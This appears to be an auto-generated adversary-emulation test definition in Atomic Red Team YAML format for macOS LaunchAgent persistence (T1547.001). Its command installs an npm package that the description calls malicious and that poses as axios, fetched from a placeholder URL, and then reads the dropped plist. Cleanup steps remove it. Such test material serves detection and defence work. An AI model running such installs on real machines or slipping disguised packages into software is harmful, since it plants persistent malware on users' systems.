# Auto-generated by CIPHER v5.0
# Source: fb9729c99e2b
attack_technique: T1547.001
display_name: "T1547.001 - macOS LaunchAgent 永続化 (plain-crypto)"
atomic_tests:
  - name: "T1547.001 - macOS LaunchAgent 永続化 (plain-crypto)"
    description: |
      Install malicious npm package (axios) that drops a LaunchAgent plist for persistence.
    supported_platforms:
      - macos
    executor:
      name: bash
      command: |
        npm install https://example.com/malicious-axios-1.14.1.tgz
        cat "$HOME/Library/LaunchAgents/com.plain.crypto.plist"
      cleanup_command: |
        launchctl unload "$HOME/Library/LaunchAgents/com.plain.crypto.plist" || true
        rm -f "$HOME/Library/LaunchAgents/com.plain.crypto.plist"
        npm uninstall axios
